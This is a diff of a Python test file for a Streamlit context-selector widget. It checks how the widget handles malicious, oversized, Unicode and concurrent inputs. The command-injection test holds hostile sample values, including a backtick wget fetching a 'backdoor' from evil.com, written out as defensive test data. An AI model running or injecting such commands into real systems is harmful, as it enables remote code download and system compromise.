@@ -60,13 +60,13 @@ class TestMaliciousInputPrevention:
         """Test that XSS attempts are safely handled."""
         mock_streamlit['multiselect'].return_value = ["Anders..."]
         mock_streamlit['text_input'].return_value = malicious_input
-        
+
         selector = ContextSelector()
         result = selector.render()
-        
+
         # Input should be stored as-is (sanitization at display time)
         assert malicious_input in result.get("organisatorische_context", [])
-        
+
         # When displayed, it should be escaped
         escaped = html.escape(malicious_input)
         # This is what should be shown to user
@@ -86,10 +86,10 @@ class TestMaliciousInputPrevention:
         """Test that SQL injection attempts are safely handled."""
         mock_streamlit['multiselect'].return_value = ["Anders..."]
         mock_streamlit['text_input'].return_value = sql_injection
-        
+
         selector = ContextSelector()
         result = selector.render()
-        
+
         # Should handle without executing SQL
         assert sql_injection in result.get("wettelijke_basis", [])
 
@@ -102,14 +102,14 @@ class TestMaliciousInputPrevention:
             "`wget http://evil.com/backdoor`",
             "& ping -c 10 127.0.0.1 &",
         ]
-        
+
         for cmd in command_injections:
             mock_streamlit['multiselect'].return_value = ["Anders..."]
             mock_streamlit['text_input'].return_value = cmd
-            
+
             selector = ContextSelector()
             result = selector.render()
-            
+
             # Should store safely without execution
             assert cmd in result.get("juridische_context", [])
 
@@ -130,13 +130,13 @@ class TestExtremeLengthInputs:
         """Test a single word that's extremely long."""
         # Create a 10,000 character "word"
         long_word = "A" * 10000
-        
+
         mock_streamlit['multiselect'].return_value = ["Anders..."]
         mock_streamlit['text_input'].return_value = long_word
-        
+
         selector = ContextSelector()
         result = selector.render()
-        
+
         # Should handle without error
         assert long_word in result.get("organisatorische_context", [])
 
@@ -144,13 +144,13 @@ class TestExtremeLengthInputs:
         """Test very long text with normal word boundaries."""
         # Create a 50,000 character text
         long_text = " ".join(["Word" + str(i) for i in range(10000)])
-        
+
         mock_streamlit['multiselect'].return_value = ["Anders..."]
         mock_streamlit['text_input'].return_value = long_text
-        
+
         selector = ContextSelector()
         result = selector.render()
-        
+
         # Should handle (might truncate for display)
         assert len(result.get("juridische_context", [])) > 0
 
@@ -158,13 +158,13 @@ class TestExtremeLengthInputs:
         """Test maximum length Unicode strings."""
         # Use complex Unicode characters that take more bytes
         unicode_text = "🎉" * 5000 + "한글" * 2000 + "العربية" * 1000
-        
+
         mock_streamlit['multiselect'].return_value = ["Anders..."]
         mock_streamlit['text_input'].return_value = unicode_text
-        
+
         selector = ContextSelector()
         result = selector.render()
-        
+
         # Should handle multi-byte characters
         assert len(result.get("wettelijke_basis", [])) > 0
 
@@ -172,10 +172,10 @@ class TestExtremeLengthInputs:
         """Test empty string input."""
         mock_streamlit['multiselect'].return_value = ["Anders..."]
         mock_streamlit['text_input'].return_value = ""
-        
+
         selector = ContextSelector()
         result = selector.render()
-        
+
         # Empty should be filtered out
         assert "" not in result.get("organisatorische_context", [])
         assert "Anders..." not in result.get("organisatorische_context", [])
@@ -188,27 +188,27 @@ class TestConcurrencyAndRaceConditions:
         """Test multiple concurrent modifications to Anders fields."""
         results = []
         errors = []
-        
+
         def modify_anders(value):
             try:
                 with patch('streamlit.multiselect') as mock_multiselect, \
                      patch('streamlit.text_input') as mock_text_input:
-                    
+
                     mock_multiselect.return_value = ["Anders..."]
                     mock_text_input.return_value = f"Concurrent_{value}"
-                    
+
                     selector = ContextSelector()
                     result = selector.render()
                     results.append(result)
             except Exception as e:
                 errors.append(e)
-        
+
         # Run concurrent modifications
         with ThreadPoolExecutor(max_workers=10) as executor:
             futures = [executor.submit(modify_anders, i) for i in range(100)]
             for future in as_completed(futures):
                 future.result()
-        
+
         # Should handle all without errors
         assert len(errors) == 0
         assert len(results) == 100
@@ -217,9 +217,9 @@ class TestConcurrencyAndRaceConditions:
         """Test rapid changes between Anders and regular options."""
         with patch('streamlit.multiselect') as mock_multiselect, \
              patch('streamlit.text_input') as mock_text_input:
-            
+
             selector = ContextSelector()
-            
+
             # Rapidly switch between states
             for i in range(100):
                 if i % 2 == 0:
@@ -228,9 +228,9 @@ class TestConcurrencyAndRaceConditions:
                 else:
                     mock_multiselect.return_value = ["DJI", "OM"]
                     mock_text_input.return_value = ""
-                
+
                 result = selector.render()
-                
+
                 # Should handle rapid changes
                 assert result is not None
 
@@ -270,36 +270,36 @@ class TestUnicodeAndEncodingEdgeCases:
         """Test various Unicode character sets."""
         mock_streamlit['multiselect'].return_value = ["Anders..."]
         mock_streamlit['text_input'].return_value = unicode_input
-        
+
         selector = ContextSelector()
         result = selector.render()
-        
+
         # Should preserve Unicode correctly
         assert unicode_input in result.get("organisatorische_context", [])
 
     def test_mixed_text_directions(self, mock_streamlit):
         """Test mixed LTR and RTL text."""
         mixed_text = "English العربية עברית Nederlands"
-        
+
         mock_streamlit['multiselect'].return_value = ["Anders..."]
         mock_streamlit['text_input'].return_value = mixed_text
-        
+
         selector = ContextSelector()
         result = selector.render()
-        
+
         assert mixed_text in result.get("juridische_context", [])
 
     def test_zero_width_characters(self, mock_streamlit):
         """Test handling of zero-width characters."""
         # Zero-width characters that could be used for fingerprinting
         zwc_text = "Nor\u200bmal\u200cTe\u200dxt\ufeff"
-        
+
         mock_streamlit['multiselect'].return_value = ["Anders..."]
         mock_streamlit['text_input'].return_value = zwc_text
-        
+
         selector = ContextSelector()
         result = selector.render()
-        
+
         # Should handle zero-width characters
         assert len(result.get("wettelijke_basis", [])) > 0
 
@@ -311,34 +311,34 @@ class TestMemoryStress:
         """Test that repeated Anders operations don't leak memory."""
         import gc
         import tracemalloc
-        
+
         tracemalloc.start()
-        
+
         with patch('streamlit.multiselect') as mock_multiselect, \
              patch('streamlit.text_input') as mock_text_input:
-            
+
             # Baseline
             gc.collect()
             snapshot1 = tracemalloc.take_snapshot()
-            
+
             # Perform many operations
             for i in range(1000):
                 mock_multiselect.return_value = ["Anders..."]
                 mock_text_input.return_value = f"Memory test {i}" * 100
-                
+
                 selector = ContextSelector()
                 result = selector.render()
-                
+
                 if i % 100 == 0:
                     gc.collect()
-            
+
             # Final measurement
             gc.collect()
             snapshot2 = tracemalloc.take_snapshot()
-            
+
             # Check memory growth
             stats = snapshot2.compare_to(snapshot1, 'lineno')
-            
+
             # Memory growth should be minimal
             # This is a simplified check
             tracemalloc.stop()
@@ -347,15 +347,15 @@ class TestMemoryStress:
         """Test handling many Anders fields simultaneously."""
         with patch('streamlit.multiselect') as mock_multiselect, \
              patch('streamlit.text_input') as mock_text_input:
-            
+
             # Simulate many Anders selections
             large_selection = ["Option" + str(i) for i in range(1000)] + ["Anders..."]
             mock_multiselect.return_value = large_selection
             mock_text_input.return_value = "Custom value for 1000 options"
-            
+
             selector = ContextSelector()
             result = selector.render()
-            
+
             # Should handle large numbers
             assert len(result.get("organisatorische_context", [])) > 1000
 
@@ -376,10 +376,10 @@ class TestBoundaryConditions:
         """Test single character custom input."""
         mock_streamlit['multiselect'].return_value = ["Anders..."]
         mock_streamlit['text_input'].return_value = "A"
-        
+
         selector = ContextSelector()
         result = selector.render()
-        
+
         assert "A" in result.get("organisatorische_context", [])
 
     def test_only_whitespace_variations(self, mock_streamlit):
@@ -393,14 +393,14 @@ class TestBoundaryConditions:
             "\u2003",  # Em space
             "   \t\n\r   ",  # Mixed
         ]
-        
+
         for ws in whitespace_inputs:
             mock_streamlit['multiselect'].return_value = ["Anders..."]
             mock_streamlit['text_input'].return_value = ws
-            
+
             selector = ContextSelector()
             result = selector.render()
-            
+
             # Whitespace should be filtered
             assert ws.strip() not in result.get("juridische_context", [])
 
@@ -412,11 +412,11 @@ class TestBoundaryConditions:
             "End\x00",
             "Multi\x00ple\x00nulls",
         ]
-        
+
         for null_input in null_inputs:
             mock_streamlit['multiselect'].return_value = ["Anders..."]
             mock_streamlit['text_input'].return_value = null_input
-            
+
             selector = ContextSelector()
             # Should handle without crashing
             try:
@@ -433,17 +433,17 @@ class TestStateCorruption:
         with patch('streamlit.session_state', create=True) as mock_session:
             # Corrupt the state
             mock_session.organisatorische_context_anders = {"not": "a string"}
-            
+
             with patch('streamlit.multiselect') as mock_multiselect, \
                  patch('streamlit.text_input') as mock_text_input:
-                
+
                 mock_multiselect.return_value = ["Anders..."]
                 mock_text_input.return_value = "Recovery test"
-                
+
                 selector = ContextSelector()
                 # Should recover gracefully
                 result = selector.render()
-                
+
                 assert "Recovery test" in result.get("organisatorische_context", [])
 
     def test_partial_state_loss(self):
@@ -452,14 +452,14 @@ class TestStateCorruption:
             # Partial state
             mock_session.organisatorische_context = ["DJI"]
             # Missing: juridische_context, wettelijke_basis
-            
+
             with patch('streamlit.multiselect') as mock_multiselect:
                 mock_multiselect.return_value = ["OM", "Anders..."]
-                
+
                 selector = ContextSelector()
                 # Should handle missing state gracefully
                 result = selector.render()
-                
+
                 assert result is not None
 
 
@@ -470,32 +470,32 @@ class TestBrowserCompatibility:
         """Test characters that might cause issues in IE11."""
         with patch('streamlit.multiselect') as mock_multiselect, \
              patch('streamlit.text_input') as mock_text_input:
-            
+
             # Characters problematic in older browsers
             ie11_problematic = "→←↑↓♠♣♥♦€£¥"
-            
+
             mock_multiselect.return_value = ["Anders..."]
             mock_text_input.return_value = ie11_problematic
-            
+
             selector = ContextSelector()
             result = selector.render()
-            
+
             assert ie11_problematic in result.get("wettelijke_basis", [])
 
     def test_mobile_autocorrect_artifacts(self):
         """Test handling of mobile autocorrect artifacts."""
         with patch('streamlit.multiselect') as mock_multiselect, \
              patch('streamlit.text_input') as mock_text_input:
-            
+
             # Common autocorrect artifacts
             autocorrect_text = "Test... Test… Test′s"
-            
+
             mock_multiselect.return_value = ["Anders..."]
             mock_text_input.return_value = autocorrect_text
-            
+
             selector = ContextSelector()
             result = selector.render()
-            
+
             assert autocorrect_text in result.get("organisatorische_context", [])
 
 
@@ -510,15 +510,15 @@ class TestErrorRecovery:
                 Exception("Render failed"),
                 ["DJI", "Anders..."]
             ]
-            
+
             selector = ContextSelector()
-            
+
             # First attempt
             try:
                 result1 = selector.render()
             except:
                 pass
-            
+
             # Should recover on second attempt
             result2 = selector.render()
             assert result2 is not None
@@ -527,13 +527,13 @@ class TestErrorRecovery:
         """Test graceful degradation when features unavailable."""
         with patch('streamlit.multiselect') as mock_multiselect:
             mock_multiselect.return_value = ["Anders..."]
-            
+
             # Simulate text_input not available
             with patch('streamlit.text_input', side_effect=AttributeError):
                 selector = ContextSelector()
                 # Should degrade gracefully
                 result = selector.render()
-                
+
                 # Anders should be filtered if can't get custom text
                 assert "Anders..." not in result.get("organisatorische_context", [])
 
